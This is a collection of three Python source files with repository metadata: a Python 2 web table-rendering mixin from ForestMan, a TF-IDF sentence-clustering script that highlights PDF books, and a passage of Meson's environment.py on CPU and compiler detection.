{"blob_id": "e4775b6b39ee798ed129da0ce03bdc5bd0f98454", "directory_id": "12d99a84786fef14e738c93f8635b6b3c9b6f6b4", "path": "/ForestMan/TableDrawer.py", "content_id": "e864334106494c65c61dd18b4b04404bce2d3ede", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "BackupTheBerlios/forestman-svn", "snapshot_id": "bbc83fcda1c2d8dce2b59f9420530f1bb1f92431", "revision_id": "a82343c7b5365a67fe544a98a97b21f00e5c3908", "branch_name": "refs/heads/master", "visit_date": "2016-09-11 04:15:06.157866", "revision_date": "2004-08-10 01:30:38", "committer_date": "2004-08-10 01:30:38", "github_id": "40669306", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "3764", "extension": "py", "content": "import gettext\ngettext.install('ForestMan')\r\n\r\nfrom MiddleLayer.Globals import MiddleLayerError\r\n\r\nclass TableDrawer:\r\n\t\"\"\"\r\n\tDerived classes should provide a object member called fields that is a list of column definitions.\r\n\tEach column definition consists of a list of the displayed name, a number signifying: read/write(0),\r\n\tread only(1), read-only but allow a value on creation(2); the data name, and optionally a idlooker\r\n\tFor stright columns the data name should be the name of the column in the database\r\n\tfor idloopkup columns it should be a different name that doesnt clash with anything else in the table\r\n\t(the actual data name will be derived from the idlooker).\r\n\tDerived classes should also provide an class member 'idfield' and member funtions 'add' and 'modify'\r\n\twhich should take a dict of fields to add or modify for this table.\r\n\tThis is meant as a mixin class, and derivitives should also derive from Page, it should also\r\n\tprovide an actions method that indirects down to the actions for this class\r\n\t\"\"\"\r\n\tdef __init__(self,conn):\r\n\t\tself.conn=conn\r\n\t\tself.edit=False\r\n\r\n\tdef writeTable(self):\r\n\t\twr = self.writeln\n\t\twr('<table border=1 cellpadding=0 cellspacing=0 width=100%>')\n\t\twr('<thead><tr>')\r\n\t\tfor i in self.fields:\n\t\t\twr('<th align=center >%s</td>' % i[0])\r\n\t\twr('</tr></thead>')\r\n\r\n\t\treq = self.request()\n\t\tprint \"fields=\", req.fields()\r\n\r\n\t\tdef dolist(looker,fields):\r\n\t\t\twr(\"<td><select size=1 name=%s>\"%looker.tableinfo['IdField'])\r\n\t\t\tfor i in looker.getlist():\r\n\t\t\t\tif (i[0]==fields[looker.tableinfo['IdField']]):\r\n\t\t\t\t\twr(\"<option VALUE=%s SELECTED>%s</option>\" % i)\r\n\t\t\t\telse:\r\n\t\t\t\t\twr(\"<option VALUE=%s>%s</option>\" % i)\r\n\r\n\t\tdef addlookup(looker,fields,name):\r\n\t\t\tfields.update({name:looker.lookup(fields[looker.tableinfo['IdField']])})\r\n\r\n\t\twr('<tbody>')\t\t\n\t\tfor i in self.taskcreator.get():\r\n\t\t\tif self.edit and i[self.idfield]==req.field('id'):\n\t\t\t\twr(\"<tr><form method=post>\")\r\n\t\t\t\tfor j in self.fields:\r\n\t\t\t\t\tif j[1]==0:\r\n\t\t\t\t\t\tif len(j)>=4:\r\n\t\t\t\t\t\t\tdolist(j[3],i)\r\n\t\t\t\t\t\telse:\r\n\t\t\t\t\t\t\twr(\"<td><input type=text name=%s value='%s'></td>\"%(j[2],i[j[2]]))\r\n\t\t\t\t\telse:\r\n\t\t\t\t\t\tif len(j)>=4:\r\n\t\t\t\t\t\t\taddlookup(j[3],i,j[2])\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\twr(\"<td><input type=hidden name=%s value='%s'>%s</td>\" %(j[2],i[j[2]],i[j[2]]))\r\n\t\t\t\twr(\"<td><input type=submit name=_action_changerow value='%s'></td>\" % _(\"Change\"))\r\n\t\t\t\twr(\"</form></tr>\")\r\n\t\t\t\twr('<tr>')\r\n\t\t\telse:\r\n\t\t\t\twr('<tr>')\r\n\t\t\t\twr('<form method=post>')\r\n\t\t\t\twr(\"<input type=hidden name=id value='%s'>\" % i[self.idfield])\r\n\r\n\t\t\t\tfor j in self.fields:\r\n\t\t\t\t\tif len(j)>=4:\r\n\t\t\t\t\t\taddlookup(j[3],i,j[2])\r\n\t\t\t\t\t\r\n\t\t\t\t\twr(\"<td>%s</td>\" %i[j[2]])\r\n\t\r\n\t\t\t\twr(\"<td><input type=submit name=_action_editrow value='%s'></td>\" % _(\"Edit\") )\r\n\t\t\t\twr(\"</form>\")\r\n\t\t\t\twr('</tr>')\r\n\r\n\t\tif not self.edit:\r\n\t\t\twr(\"<tr><form method=post>\")\r\n\t\t\tfor j in self.fields:\r\n\t\t\t\tif j[1]==0 or j[1]==2:\r\n\t\t\t\t\tif len(j)>=4:\r\n\t\t\t\t\t\twr(\"<td><select size=1 name=%s>\" % j[3].tableinfo['IdField'])\r\n\t\t\t\t\t\tfor i in j[3].getlist():\r\n\t\t\t\t\t\t\twr(\"<option VALUE=%s>%s</option>\" % i)\r\n\t\t\t\t\t\twr(\"</td>\")\r\n\t\t\t\t\telse:\r\n\t\t\t\t\t\twr(\"<td><input type=text name=%s></td>\"%j[2])\r\n\t\t\t\telse:\r\n\t\t\t\t\twr(\"<td></td>\")\r\n\r\n\t\t\twr(\"<td><input type=submit name=_action_addrow value='%s'></td>\" % _(\"Add\"))\r\n\t\t\twr(\"</form></tr>\")\r\n\r\n\t\twr('</tbody>')\t\t\n\r\n\r\n\tdef addrow(self):\r\n\t\tf = self.request().fields()\r\n\t\ttry:\n\t\t\tself.add(f)\r\n\t\texcept MiddleLayerError,e:\r\n\t\t\tself.error = e\r\n\t\tself.writeBody()\r\n\t\tself.error=None\r\n\r\n\tdef changerow(self):\r\n\t\tf = self.request().fields()\r\n\t\ttry:\n\t\t\tself.modify(f)\r\n\t\texcept MiddleLayerError,e:\r\n\t\t\tself.error=e\r\n\t\tself.edit=False\r\n\t\tself.writeBody()\r\n\t\tself.error=None\r\n\r\n\tdef editrow(self):\r\n\t\tself.edit=True\r\n\t\tself.writeBody()\r\n\t\t\r\n\tdef actions(self):\n\t\treturn  ['addrow','changerow','editrow']\r\n\t\t"}
{"blob_id": "24bca20506dbe1a5f708d527013de59f2389e099", "directory_id": "5d0ede97f9bc29027647c09adba66d0e1c0a207f", "path": "/final_script.py", "content_id": "f69f7fb95182f7a0e901295abc4616e9a2f55bed", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "fateh288/important-highlight-multi-document", "snapshot_id": "794a00e85c3c22fdbf4699c969f5fa40365d66c5", "revision_id": "d7b20b6fb59cb7b1af069e49f22138930d98f105", "branch_name": "refs/heads/master", "visit_date": "2021-03-27 13:31:25.428560", "revision_date": "2017-04-14 10:39:50", "committer_date": "2017-04-14 10:39:50", "github_id": "79649058", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "5605", "extension": "py", "content": "import numpy as np\nimport pandas as pd\nimport nltk\nimport re\nimport os\nimport sys\nimport codecs\nfrom sklearn import feature_extraction\nimport mpld3\nimport scipy.cluster.hierarchy as hcluster\nimport glob\nfrom nltk.stem.snowball import SnowballStemmer\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.metrics.pairwise import cosine_similarity\nfrom operator import itemgetter\nimport pdfkit\n\ndef tokenize(paragraph) :\n    tokenList = [word for sentence in nltk.sent_tokenize(paragraph) for word in nltk.word_tokenize(sentence)]\n    \n    filteredTokens = []\n    \n    for token in tokenList:\n        if re.search('[a-zA-Z]', token):\n            filteredTokens.append(token)\n    return filteredTokens\n\n#Next step would be to remove the useless tokens. Useless tokens are raw puntuation, numeric tokens, etc.\ndef stem(filteredTokens) :\n    stemList = [stemmer.stem(tok) for tok in filteredTokens]\n    return stemList\n\ndef tokenizeAndStem(paragraph) :\n    tokens = [word for sentence in nltk.sent_tokenize(paragraph) for word in nltk.word_tokenize(sentence)]\n    filtered_tokens = []\n    for token in tokens:\n        if re.search('[a-zA-Z]', token):  #normal regex search\n            filtered_tokens.append(token)\n    stems = [stemmer.stem(t) for t in filtered_tokens]\n    return stems\n\nfilePath = './books/'\nfor filename in glob.glob(filePath + \"*.pdf\"):\n    os.system('pdftotext %s %s.txt'%(filename,os.path.splitext(filename)[0]))\n\nfileCounter = len(glob.glob(filePath + \"*.txt\"))\n\nparagraphs = []\ntopics = []\nbook_sentence_pairs=[]\nfor index, filename in enumerate(glob.glob(filePath + '*.txt')):\n    print(filename)\n    file = open(filename, 'r')\n    txt = file.read()\n    txt = txt.replace('\\n', '').split('.')\n    txt = filter(None, txt)\n    print len(txt)\n    for i in np.arange(0, len(txt)):\n        topics.append('book: %d sentence: %d' % (index, i))\n        book_sentence_pairs.append([index,i])\n        paragraphs.append(txt[i])\n\nstopwords = nltk.corpus.stopwords.words('english')\nstemmer = SnowballStemmer(\"english\")\n\nreload(sys)\nsys.setdefaultencoding('utf8')\n\ntokenizedParagraphList = []\nstemmedParagraphList = []\nfor i in paragraphs :\n    tokenizedParagraph = tokenize(i)\n    tokenizedParagraphList.extend(tokenizedParagraph)\n    stemmedParagraphList.extend(stem(tokenizedParagraph))\n\nvocabFrame = pd.DataFrame({'words': tokenizedParagraphList}, index = stemmedParagraphList)\nprint 'there are ' + str(vocabFrame.shape[0]) + ' items in vocab_frame'\n\n#for tfidf, there are two important things, max_df & min_df;\n#max_df - When building the vocabulary ignore terms that have a document frequency strictly higher than the given threshold (corpus-specific stop words).\n#min_idf - When building the vocabulary ignore terms that have a document frequency strictly lower than the given threshold. This value is also called cut-off in the literature.\ntfidfVectorizer = TfidfVectorizer(stop_words='english', use_idf=True, tokenizer=tokenizeAndStem, ngram_range=(1,3))\n#Now fit the vectorizer to synopses\ntfidf_matrix = tfidfVectorizer.fit_transform(paragraphs)\n#Now we calculate the cosine similarity as follows. This will gives us the distance which wil help us in clustering in the later stage.\ndist = 1 - cosine_similarity(tfidf_matrix)\n#heirarchical clustering\nthresh=1.05*np.average(dist)\nclusters = hcluster.fclusterdata(dist, thresh, criterion=\"distance\")\n\nnumClusters = max(clusters)\n\n#preperation of data for further processing\nclusterStatements = []\nclusterIndices = []\nfor i in range(0,numClusters,1) :\n    clusterStatements.append([])\n    clusterIndices.append([])\nfor i in range(0, len(paragraphs), 1) :\n    clusterStatements[clusters[i]-1].append(paragraphs[i])\n    clusterIndices[clusters[i]-1].append(i)\n\n#tfidf inside each of the clusters to find the most unique statement inside each of the statements\nfinal_sentence_indices=[]\nfor k in range(0, numClusters, 1) :\n    tfidfVectorizerCluster = TfidfVectorizer(stop_words='english', use_idf=True, tokenizer=tokenizeAndStem, ngram_range=(1,3))\n    tfidfMatrixCluster = tfidfVectorizerCluster.fit_transform(clusterStatements[k])\n    distCluster = 1 - cosine_similarity(tfidfMatrixCluster)\n    maxClusterDistance=0\n    farthestSentence=0\n    for i in range(0, len(distCluster), 1) :\n        temp=0\n        for j in range(0, len(distCluster[i]), 1) :\n            temp+=distCluster[i][j]\n        farthestSentence = farthestSentence if maxClusterDistance<temp else i\n        maxClusterDistance = maxClusterDistance if maxClusterDistance<temp else temp\n    final_sentence_indices.append(clusterIndices[k][farthestSentence])\n\n#sorting each of the pairs on the book number and sentence number\nfinal_book_sentence_pairs=[]\nfor i in final_sentence_indices:\n    final_book_sentence_pairs.append(book_sentence_pairs[i])\nfinal_book_sentence_pairs=sorted(final_book_sentence_pairs,key=itemgetter(0,1))\n\n#marking of the sentences, conversion to html followed by conversion to pdf\nfor index, filename in enumerate(glob.glob(filePath + '/*.txt')):\n    file = open(filename, 'r')\n    txt = file.read()\n    txt = txt.replace('\\n', '').split('.')\n    for i,line in enumerate(final_book_sentence_pairs):\n        if(final_book_sentence_pairs[i][0]==index):\n            txt[line[1]]='<mark>'+txt[line[1]]+'</mark>'\n    txt='.'.join(txt)\n    Html_file= open(os.path.splitext(filename)[0]+'.html',\"w\")\n    Html_file.write(txt)\n    Html_file.close()\n    pdfkit.from_url(os.path.splitext(filename)[0]+'.html', os.path.splitext(filename)[0]+'_marked'+'.pdf')\n\n#new pdf's with marked sentences with 'oldname'_marked.pdf created in the books folder\n"}
{"blob_id": "f79692bb6632a4e3d3070997ac12ba13e0f90944", "directory_id": "35af97fe32f3a5e499df1bd5d58075b95dca368f", "path": "/mesonbuild/environment.py", "content_id": "d29a77f0e019c64c2cf2bb68ce9ee39349e45f6c", "detected_licenses": "['Apache-2.0']", "license_type": "permissive", "repo_name": "Pardus-Kurumsal/meson", "snapshot_id": "27124b96dfaaa718d922c685d09125c3721c4714", "revision_id": "97020cda65104c510ea917b68759ba8ceed49828", "branch_name": "refs/heads/master", "visit_date": "2020-04-10 17:39:36.961275", "revision_date": "2018-12-10 11:50:56", "committer_date": "2018-12-10 11:50:56", "github_id": "161180145", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "43837", "extension": "py", "content": "# Copyright 2012-2016 The Meson development team\n\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n\n#     http://www.apache.org/licenses/LICENSE-2.0\n\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport configparser, os, platform, re, shlex, shutil, subprocess\n\nfrom . import coredata\nfrom .linkers import ArLinker, VisualStudioLinker\nfrom . import mesonlib\nfrom .mesonlib import EnvironmentException, Popen_safe\nfrom . import mlog\n\nfrom . import compilers\nfrom .compilers import (\n    CLANG_OSX,\n    CLANG_STANDARD,\n    CLANG_WIN,\n    GCC_CYGWIN,\n    GCC_MINGW,\n    GCC_OSX,\n    GCC_STANDARD,\n    ICC_STANDARD,\n    is_assembly,\n    is_header,\n    is_library,\n    is_llvm_ir,\n    is_object,\n    is_source,\n)\nfrom .compilers import (\n    ArmCCompiler,\n    ArmCPPCompiler,\n    ArmclangCCompiler,\n    ArmclangCPPCompiler,\n    ClangCCompiler,\n    ClangCPPCompiler,\n    ClangObjCCompiler,\n    ClangObjCPPCompiler,\n    G95FortranCompiler,\n    GnuCCompiler,\n    GnuCPPCompiler,\n    GnuFortranCompiler,\n    GnuObjCCompiler,\n    GnuObjCPPCompiler,\n    ElbrusCCompiler,\n    ElbrusCPPCompiler,\n    ElbrusFortranCompiler,\n    IntelCCompiler,\n    IntelCPPCompiler,\n    IntelFortranCompiler,\n    JavaCompiler,\n    MonoCompiler,\n    VisualStudioCsCompiler,\n    NAGFortranCompiler,\n    Open64FortranCompiler,\n    PathScaleFortranCompiler,\n    PGIFortranCompiler,\n    RustCompiler,\n    SunFortranCompiler,\n    ValaCompiler,\n    VisualStudioCCompiler,\n    VisualStudioCPPCompiler,\n)\n\nbuild_filename = 'meson.build'\n\nknown_cpu_families = (\n    'aarch64',\n    'arm',\n    'e2k',\n    'ia64',\n    'mips',\n    'mips64',\n    'parisc',\n    'ppc',\n    'ppc64',\n    'riscv32',\n    'riscv64',\n    's390x',\n    'sparc',\n    'sparc64',\n    'x86',\n    'x86_64'\n)\n\ndef detect_gcovr(version='3.1', log=False):\n    gcovr_exe = 'gcovr'\n    try:\n        p, found = Popen_safe([gcovr_exe, '--version'])[0:2]\n    except (FileNotFoundError, PermissionError):\n        # Doesn't exist in PATH or isn't executable\n        return None, None\n    found = search_version(found)\n    if p.returncode == 0:\n        if log:\n            mlog.log('Found gcovr-{} at {}'.format(found, shlex.quote(shutil.which(gcovr_exe))))\n        return gcovr_exe, mesonlib.version_compare(found, '>=' + version)\n    return None, None\n\ndef find_coverage_tools():\n    gcovr_exe, gcovr_new_rootdir = detect_gcovr()\n\n    lcov_exe = 'lcov'\n    genhtml_exe = 'genhtml'\n\n    if not mesonlib.exe_exists([lcov_exe, '--version']):\n        lcov_exe = None\n    if not mesonlib.exe_exists([genhtml_exe, '--version']):\n        genhtml_exe = None\n\n    return gcovr_exe, gcovr_new_rootdir, lcov_exe, genhtml_exe\n\ndef detect_ninja(version='1.5', log=False):\n    for n in ['ninja', 'ninja-build']:\n        try:\n            p, found = Popen_safe([n, '--version'])[0:2]\n        except (FileNotFoundError, PermissionError):\n            # Doesn't exist in PATH or isn't executable\n            continue\n        found = found.strip()\n        # Perhaps we should add a way for the caller to know the failure mode\n        # (not found or too old)\n        if p.returncode == 0 and mesonlib.version_compare(found, '>=' + version):\n            if log:\n                mlog.log('Found ninja-{} at {}'.format(found, shlex.quote(shutil.which(n))))\n            return n\n\ndef detect_native_windows_arch():\n    \"\"\"\n    The architecture of Windows itself: x86 or amd64\n    \"\"\"\n    # These env variables are always available. See:\n    # https://msdn.microsoft.com/en-us/library/aa384274(VS.85).aspx\n    # https://blogs.msdn.microsoft.com/david.wang/2006/03/27/howto-detect-process-bitness/\n    arch = os.environ.get('PROCESSOR_ARCHITEW6432', '').lower()\n    if not arch:\n        try:\n            # If this doesn't exist, something is messing with the environment\n            arch = os.environ['PROCESSOR_ARCHITECTURE'].lower()\n        except KeyError:\n            raise EnvironmentException('Unable to detect native OS architecture')\n    return arch\n\ndef detect_windows_arch(compilers):\n    \"\"\"\n    Detecting the 'native' architecture of Windows is not a trivial task. We\n    cannot trust that the architecture that Python is built for is the 'native'\n    one because you can run 32-bit apps on 64-bit Windows using WOW64 and\n    people sometimes install 32-bit Python on 64-bit Windows.\n\n    We also can't rely on the architecture of the OS itself, since it's\n    perfectly normal to compile and run 32-bit applications on Windows as if\n    they were native applications. It's a terrible experience to require the\n    user to supply a cross-info file to compile 32-bit applications on 64-bit\n    Windows. Thankfully, the only way to compile things with Visual Studio on\n    Windows is by entering the 'msvc toolchain' environment, which can be\n    easily detected.\n\n    In the end, the sanest method is as follows:\n    1. Check if we're in an MSVC toolchain environment, and if so, return the\n       MSVC toolchain architecture as our 'native' architecture.\n    2. If not, check environment variables that are set by Windows and WOW64 to\n       find out the architecture that Windows is built for, and use that as our\n       'native' architecture.\n    \"\"\"\n    os_arch = detect_native_windows_arch()\n    if os_arch != 'amd64':\n        return os_arch\n    # If we're on 64-bit Windows, 32-bit apps can be compiled without\n    # cross-compilation. So if we're doing that, just set the native arch as\n    # 32-bit and pretend like we're running under WOW64. Else, return the\n    # actual Windows architecture that we deduced above.\n    for compiler in compilers.values():\n        # Check if we're using and inside an MSVC toolchain environment\n        if compiler.id == 'msvc' and 'VCINSTALLDIR' in os.environ:\n            if float(compiler.get_toolset_version()) < 10.0:\n                # On MSVC 2008 and earlier, check 'BUILD_PLAT', where\n                # 'Win32' means 'x86'\n                platform = os.environ.get('BUILD_PLAT', 'x86')\n                if platform == 'Win32':\n                    return 'x86'\n            else:\n                # On MSVC 2010 and later 'Platform' is only set when the\n                # target arch is not 'x86'.  It's 'x64' when targeting\n                # x86_64 and 'arm' when targeting ARM.\n                platform = os.environ.get('Platform', 'x86').lower()\n            if platform == 'x86':\n                return platform\n        if compiler.id == 'gcc' and compiler.has_builtin_define('__i386__'):\n            return 'x86'\n    return os_arch\n\ndef detect_cpu_family(compilers):\n    \"\"\"\n    Python is inconsistent in its platform module.\n    It returns different values for the same cpu.\n    For x86 it might return 'x86', 'i686' or somesuch.\n    Do some canonicalization.\n    \"\"\"\n    if mesonlib.is_windows():\n        trial = detect_windows_arch(compilers)\n    else:\n        trial = platform.machine().lower()\n\n    # Add mappings here as bugs are reported.\n    if trial.startswith('i') and trial.endswith('86'):\n        return 'x86'\n    if trial.startswith('arm'):\n        return 'arm'\n    if trial == 'mipsel':\n        return 'mips'\n    if trial == 'mips64el':\n        return 'mips64'\n    if trial.startswith('ppc64'):\n        return 'ppc64'\n    if trial in ('amd64', 'x64'):\n        trial = 'x86_64'\n    if trial == 'x86_64':\n        # On Linux (and maybe others) there can be any mixture of 32/64 bit\n        # code in the kernel, Python, system etc. The only reliable way\n        # to know is to check the compiler defines.\n        for c in compilers.values():\n            try:\n                if c.has_builtin_define('__i386__'):\n                    return 'x86'\n            except mesonlib.MesonException:\n                # Ignore compilers that do not support has_builtin_define.\n                pass\n        return 'x86_64'\n\n    if trial not in known_cpu_families:\n        mlog.warning('Unknown CPU family {!r}, please report this at '\n                     'https://github.com/mesonbuild/meson/issues/new with the'\n                     'output of `uname -a` and `cat /proc/cpuinfo`'.format(trial))\n\n    return trial\n\ndef detect_cpu(compilers):\n    if mesonlib.is_windows():\n        trial = detect_windows_arch(compilers)\n    else:\n        trial = platform.machine().lower()\n    if trial in ('amd64', 'x64'):\n        trial = 'x86_64'\n    if trial == 'x86_64':\n        # Same check as above for cpu_family\n        for c in compilers.values():\n            try:\n                if c.has_builtin_define('__i386__'):\n                    return 'i686' # All 64 bit cpus have at least this level of x86 support.\n            except mesonlib.MesonException:\n                pass\n        return 'x86_64'\n    if trial == 'e2k':\n        # Make more precise CPU detection for Elbrus platform.\n        trial = platform.processor().lower()\n    # Add fixes here as bugs are reported.\n    return trial\n\ndef detect_system():\n    system = platform.system().lower()\n    if system.startswith('cygwin'):\n        return 'cygwin'\n    return system\n\ndef detect_msys2_arch():\n    if 'MSYSTEM_CARCH' in os.environ:\n        return os.environ['MSYSTEM_CARCH']\n    return None\n\ndef search_version(text):\n    # Usually of the type 4.1.4 but compiler output may contain\n    # stuff like this:\n    # (Sourcery CodeBench Lite 2014.05-29) 4.8.3 20140320 (prerelease)\n    # Limiting major version number to two digits seems to work\n    # thus far. When we get to GCC 100, this will break, but\n    # if we are still relevant when that happens, it can be\n    # considered an achievement in itself.\n    #\n    # This regex is reaching magic levels. If it ever needs\n    # to be updated, do not complexify but convert to something\n    # saner instead.\n    version_regex = '(?<!(\\d|\\.))(\\d{1,2}(\\.\\d+)+(-[a-zA-Z0-9]+)?)'\n    match = re.search(version_regex, text)\n    if match:\n        return match.group(0)\n    return 'unknown version'\n\nclass Environment:\n    private_dir = 'meson-private'\n    log_dir = 'meson-logs'\n\n    def __init__(self, source_dir, build_dir, options):\n        self.source_dir = source_dir\n        self.build_dir = build_dir\n        self.scratch_dir = os.path.join(build_dir, Environment.private_dir)\n        self.log_dir = os.path.join(build_dir, Environment.log_dir)\n        os.makedirs(self.scratch_dir, exist_ok=True)\n        os.makedirs(self.log_dir, exist_ok=True)\n        try:\n            self.coredata = coredata.load(self.get_build_dir())\n            self.first_invocation = False\n        except FileNotFoundError:\n            # WARNING: Don't use any values from coredata in __init__. It gets\n            # re-initialized with project options by the interpreter during\n            # build file parsing.\n            self.coredata = coredata.CoreData(options)\n            # Used by the regenchecker script, which runs meson\n            self.coredata.meson_command = mesonlib.meson_command\n            self.first_invocation = True\n        if self.coredata.cross_file:\n            self.cross_info = CrossBuildInfo(self.coredata.cross_file)\n        else:\n            self.cross_info = None\n        self.cmd_line_options = options.cmd_line_options.copy()\n\n        # List of potential compilers.\n        if mesonlib.is_windows():\n            self.default_c = ['cl', 'cc', 'gcc', 'clang']\n            self.default_cpp = ['cl', 'c++', 'g++', 'clang++']\n        else:\n            self.default_c = ['cc', 'gcc', 'clang']\n            self.default_cpp = ['c++', 'g++', 'clang++']\n        if mesonlib.is_windows():\n            self.default_cs = ['csc', 'mcs']\n        else:\n            self.default_cs = ['mcs', 'csc']\n        self.default_objc = ['cc']\n        self.default_objcpp = ['c++']\n        self.default_fortran = ['gfortran', 'g95', 'f95', 'f90', 'f77', 'ifort']\n        self.default_rust = ['rustc']\n        self.default_static_linker = ['ar']\n        self.vs_static_linker = ['lib']\n        self.gcc_static_linker = ['gcc-ar']\n        self.clang_static_linker = ['llvm-ar']\n\n        # Various prefixes and suffixes for import libraries, shared libraries,\n        # static libraries, and executables.\n        # Versioning is added to these names in the backends as-needed.\n        cross = self.is_cross_build()\n        if (not cross and mesonlib.is_windows()) \\\n                or (cross and self.cross_info.has_host() and self.cross_info.config['host_machine']['system'] == 'windows'):\n            self.exe_suffix = 'exe'\n            self.object_suffix = 'obj'\n            self.win_libdir_layout = True\n        elif (not cross and mesonlib.is_cygwin()) \\\n                or (cross and self.cross_info.has_host() and self.cross_info.config['host_machine']['system'] == 'cygwin'):\n            self.exe_suffix = 'exe'\n            self.object_suffix = 'o'\n            self.win_libdir_layout = True\n        else:\n            self.exe_suffix = ''\n            self.object_suffix = 'o'\n            self.win_libdir_layout = False\n        if 'STRIP' in os.environ:\n            self.native_strip_bin = shlex.split(os.environ['STRIP'])\n        else:\n            self.native_strip_bin = ['strip']\n\n    def is_cross_build(self):\n        return self.cross_info is not None\n\n    def dump_coredata(self):\n        return coredata.save(self.coredata, self.get_build_dir())\n\n    def get_script_dir(self):\n        import mesonbuild.scripts\n        return os.path.dirname(mesonbuild.scripts.__file__)\n\n    def get_log_dir(self):\n        return self.log_dir\n\n    def get_coredata(self):\n        return self.coredata\n\n    def get_build_command(self, unbuffered=False):\n        cmd = mesonlib.meson_command[:]\n        if unbuffered and 'python' in cmd[0]:\n            cmd.insert(1, '-u')\n        return cmd\n\n    def is_header(self, fname):\n        return is_header(fname)\n\n    def is_source(self, fname):\n        return is_source(fname)\n\n    def is_assembly(self, fname):\n        return is_assembly(fname)\n\n    def is_llvm_ir(self, fname):\n        return is_llvm_ir(fname)\n\n    def is_object(self, fname):\n        return is_object(fname)\n\n    def is_library(self, fname):\n        return is_library(fname)\n\n    @staticmethod\n    def get_gnu_compiler_defines(compiler):\n        \"\"\"\n        Detect GNU compiler platform type (Apple, MinGW, Unix)\n        \"\"\"\n        # Arguments to output compiler pre-processor defines to stdout\n        # gcc, g++, and gfortran all support these arguments\n        args = compiler + ['-E', '-dM', '-']\n        p, output, error = Popen_safe(args, write='', stdin=subprocess.PIPE)\n        if p.returncode != 0:\n            raise EnvironmentException('Unable to detect GNU compiler type:\\n' + output + error)\n        # Parse several lines of the type:\n        # `#define ___SOME_DEF some_value`\n        # and extract `___SOME_DEF`\n        defines = {}\n        for line in output.split('\\n'):\n            if not line:\n                continue\n            d, *rest = line.split(' ', 2)\n            if d != '#define':\n                continue\n            if len(rest) == 1:\n                defines[rest] = True\n            if len(rest) == 2:\n                defines[rest[0]] = rest[1]\n        return defines\n\n    @staticmethod\n    def get_gnu_version_from_defines(defines):\n        dot = '.'\n        major = defines.get('__GNUC__', '0')\n        minor = defines.get('__GNUC_MINOR__', '0')\n        patch = defines.get('__GNUC_PATCHLEVEL__', '0')\n        return dot.join((major, minor, patch))\n\n    @staticmethod\n    def get_lcc_version_from_defines(defines):\n        dot = '.'\n        generation_and_major = defines.get('__LCC__', '100')\n        generation = generation_and_major[:1]\n        major = generation_and_major[1:]\n        minor = defines.get('__LCC_MINOR__', '0')\n        return dot.join((generation, major, minor))\n\n    @staticmethod\n    def get_gnu_compiler_type(defines):\n        # Detect GCC type (Apple, MinGW, Cygwin, Unix)\n        if '__APPLE__' in defines:\n            return GCC_OSX\n        elif '__MINGW32__' in defines or '__MINGW64__' in defines:\n            return GCC_MINGW\n        elif '__CYGWIN__' in defines:\n            return GCC_CYGWIN\n        return GCC_STANDARD\n\n    def warn_about_lang_pointing_to_cross(self, compiler_exe, evar):\n        evar_str = os.environ.get(evar, 'WHO_WOULD_CALL_THEIR_COMPILER_WITH_THIS_NAME')\n        if evar_str == compiler_exe:\n            mlog.warning('''Env var %s seems to point to the cross compiler.\nThis is probably wrong, it should always point to the native compiler.''' % evar)\n\n    def _get_compilers(self, lang, evar, want_cross):\n        '''\n        The list of compilers is detected in the exact same way for\n        C, C++, ObjC, ObjC++, Fortran, CS so consolidate it here.\n        '''\n        if self.is_cross_build() and want_cross:\n            if lang not in self.cross_info.config['binaries']:\n                raise EnvironmentException('{!r} compiler binary not defined in cross file'.format(lang))\n            compilers = mesonlib.stringlistify(self.cross_info.config['binaries'][lang])\n            # Ensure ccache exists and remove it if it doesn't\n            if compilers[0] == 'ccache':\n                compilers = compilers[1:]\n                ccache = self.detect_ccache()\n            else:\n                ccache = []\n            self.warn_about_lang_pointing_to_cross(compilers[0], evar)\n            # Return value has to be a list of compiler 'choices'\n            compilers = [compilers]\n            is_cross = True\n            if self.cross_info.need_exe_wrapper():\n                exe_wrap = self.cross_info.config['binaries'].get('exe_wrapper', None)\n            else:\n                exe_wrap = []\n        elif evar in os.environ:\n            compilers = shlex.split(os.environ[evar])\n            # Ensure ccache exists and remove it if it doesn't\n            if compilers[0] == 'ccache':\n                compilers = compilers[1:]\n                ccache = self.detect_ccache()\n            else:\n                ccache = []\n            # Return value has to be a list of compiler 'choices'\n            compilers = [compilers]\n            is_cross = False\n            exe_wrap = None\n        else:\n            compilers = getattr(self, 'default_' + lang)\n            ccache = self.detect_ccache()\n            is_cross = False\n            exe_wrap = None\n        return compilers, ccache, is_cross, exe_wrap\n\n    def _handle_exceptions(self, exceptions, binaries, bintype='compiler'):\n        errmsg = 'Unknown {}(s): {}'.format(bintype, binaries)\n        if exceptions:\n            errmsg += '\\nThe follow exceptions were encountered:'\n            for (c, e) in exceptions.items():\n                errmsg += '\\nRunning \"{0}\" gave \"{1}\"'.format(c, e)\n        raise EnvironmentException(errmsg)\n\n    def _detect_c_or_cpp_compiler(self, lang, evar, want_cross):\n        popen_exceptions = {}\n        compilers, ccache, is_cross, exe_wrap = self._get_compilers(lang, evar, want_cross)\n        for compiler in compilers:\n            if isinstance(compiler, str):\n                compiler = [compiler]\n            if 'cl' in compiler or 'cl.exe' in compiler:\n                # Watcom C provides it's own cl.exe clone that mimics an older\n                # version of Microsoft's compiler. Since Watcom's cl.exe is\n                # just a wrapper, we skip using it if we detect its presence\n                # so as not to confuse Meson when configuring for MSVC.\n                #\n                # Additionally the help text of Watcom's cl.exe is paged, and\n                # the binary will not exit without human 